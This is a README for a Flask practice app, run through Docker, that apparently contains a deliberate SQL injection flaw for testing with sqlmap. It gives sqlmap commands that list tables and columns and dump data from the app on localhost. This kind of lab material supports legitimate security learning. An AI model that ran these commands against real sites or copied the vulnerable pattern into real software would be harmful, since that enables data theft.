# sqlmap_playground

Simple web app written in python using flask and sqlmap to test sql injections attacks using sqlmap

## How to run:
Deploy using docker: 
```
docker-compose up --build
```
Access from your browser:
`http://localhost:5000/`

Sample payloads:
```
sqlmap -u "http://localhost:5000/?name=1" --tables --risk=3 --level=3 # to list tables 
sqlmap -u "http://localhost:5000/?name=1" -T ${table} --columns --risk=3 --level=3 # to list columns
sqlmap -u "http://localhost:5000/?name=1" -T ${Table} -C ${columns} --dump --risk=3 --level=3 # to dump column from table
```
